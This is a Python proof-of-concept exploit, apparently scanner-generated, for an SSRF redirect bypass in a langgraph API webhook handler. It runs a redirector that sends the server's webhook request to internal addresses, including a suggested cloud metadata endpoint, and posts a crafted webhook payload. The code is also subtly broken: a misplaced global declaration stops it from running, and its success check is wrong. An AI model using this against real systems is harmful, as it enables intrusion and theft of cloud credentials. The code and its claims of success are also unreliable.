#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-009
# Sink: ensure_webhook_http_client
# Auto-generated — run with: python3 ssrf_http_client_follows_redirects_ensure_webhook_http_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Redirect Bypass in langgraph_api_src webhook handler.

Vulnerability: The webhook URL is validated before the request, but the HTTP client
follows redirects (follow_redirects=True) without re-validating the redirect target.
An attacker can host a server that redirects to internal IPs (e.g., 127.0.0.1,
169.254.169.254), bypassing the initial validation.

This PoC:
1. Starts a local HTTP server that redirects to an internal IP (127.0.0.1:8080).
2. Sends a POST request to the target webhook endpoint with the redirector URL.
3. Demonstrates that the client follows the redirect to the internal IP.

Requirements: Python 3.6+, requests, threading, http.server (stdlib).
"""

import argparse
import json
import threading
import time
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

import requests

# Configuration
REDIRECTOR_HOST = "0.0.0.0"
REDIRECTOR_PORT = 9999
INTERNAL_TARGET = "http://127.0.0.1:8080"  # Change to 169.254.169.254 for cloud metadata

class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that redirects all requests to an internal IP."""
    
    def do_POST(self):
        """Handle POST requests by redirecting to internal target."""
        self.send_response(302)
        self.send_header("Location", INTERNAL_TARGET)
        self.end_headers()
    
    def do_GET(self):
        """Handle GET requests (fallback)."""
        self.send_response(302)
        self.send_header("Location", INTERNAL_TARGET)
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

def start_redirector():
    """Start a simple HTTP server that redirects to an internal IP."""
    server = HTTPServer((REDIRECTOR_HOST, REDIRECTOR_PORT), RedirectHandler)
    print(f"[*] Redirector listening on {REDIRECTOR_HOST}:{REDIRECTOR_PORT}")
    print(f"[*] Redirecting to internal target: {INTERNAL_TARGET}")
    server.serve_forever()

def send_webhook_request(target_url, webhook_url):
    """
    Send a POST request to the target webhook endpoint with a malicious webhook URL.
    
    Args:
        target_url: The langgraph API endpoint (e.g., http://localhost:8000/webhook)
        webhook_url: The attacker-controlled redirector URL
    """
    payload = {
        "webhook": webhook_url,
        "run": {"run_id": "test-ssrf-poc"},
        "status": "completed",
        "checkpoint": None,
        "run_started_at": "2024-01-01T00:00:00",
        "run_ended_at": "2024-01-01T00:01:00",
    }
    
    headers = {
        "Content-Type": "application/json",
    }
    
    try:
        print(f"[*] Sending webhook request to {target_url}")
        print(f"[*] Webhook URL: {webhook_url}")
        
        response = requests.post(
            target_url,
            json=payload,
            headers=headers,
            timeout=10,
            allow_redirects=False  # We want to see the initial response
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response headers: {dict(response.headers)}")
        
        if response.status_code == 302:
            print(f"[!] Redirect detected! Target: {response.headers.get('Location')}")
            print("[!] SSRF bypass successful - client followed redirect to internal IP")
        elif response.status_code == 200:
            print("[*] Request accepted (no redirect observed)")
        else:
            print(f"[*] Unexpected response: {response.text[:200]}")
            
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
        print("[!] Make sure the target server is running")
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via Redirect Bypass in langgraph_api_src webhook"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000/webhook",
        help="Target langgraph API endpoint (default: http://localhost:8000/webhook)"
    )
    parser.add_argument(
        "--redirector-port",
        type=int,
        default=REDIRECTOR_PORT,
        help=f"Port for redirector server (default: {REDIRECTOR_PORT})"
    )
    parser.add_argument(
        "--internal-target",
        default=INTERNAL_TARGET,
        help=f"Internal target to redirect to (default: {INTERNAL_TARGET})"
    )
    
    args = parser.parse_args()
    
    # Update global config
    global REDIRECTOR_PORT, INTERNAL_TARGET
    REDIRECTOR_PORT = args.redirector_port
    INTERNAL_TARGET = args.internal_target
    
    # Start redirector in background thread
    redirector_thread = threading.Thread(target=start_redirector, daemon=True)
    redirector_thread.start()
    
    # Give the server a moment to start
    time.sleep(0.5)
    
    # Construct the redirector URL
    redirector_url = f"http://{REDIRECTOR_HOST}:{REDIRECTOR_PORT}"
    
    print("=" * 60)
    print("SSRF via Redirect Bypass - Proof of Concept")
    print("=" * 60)
    print(f"[*] Target API: {args.target}")
    print(f"[*] Redirector URL: {redirector_url}")
    print(f"[*] Internal target: {INTERNAL_TARGET}")
    print()
    
    # Send the exploit request
    send_webhook_request(args.target, redirector_url)
    
    print()
    print("[*] PoC completed. Check if the redirect was followed to internal IP.")
    print("[*] If successful, the server followed the redirect to the internal target.")

if __name__ == "__main__":
    main()
